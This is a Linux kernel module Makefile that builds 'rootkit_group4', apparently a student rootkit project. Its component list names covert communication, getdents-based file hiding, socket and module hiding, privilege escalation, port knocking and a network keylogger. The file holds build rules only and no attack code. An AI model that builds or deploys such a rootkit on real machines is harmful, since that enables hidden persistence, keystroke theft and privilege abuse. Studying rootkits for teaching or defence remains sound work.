obj-m += rootkit_group4.o
rootkit_group4-y := control.o covert_communication.o getdents.o hide_socket.o include.o main.o privilege_escalation.o port_knocking.o read.o hide_module.o net_keylog.o	
#ccflags-y = -std=gnu99 -Wno-declaration-after-statement
ccflags-y = -DDEBUG

all:	sysmap
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

sysmap:
	./gensysmap.sh
	@echo "Generated sysmap.h"

clean:
	@rm -f sysmap.h
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

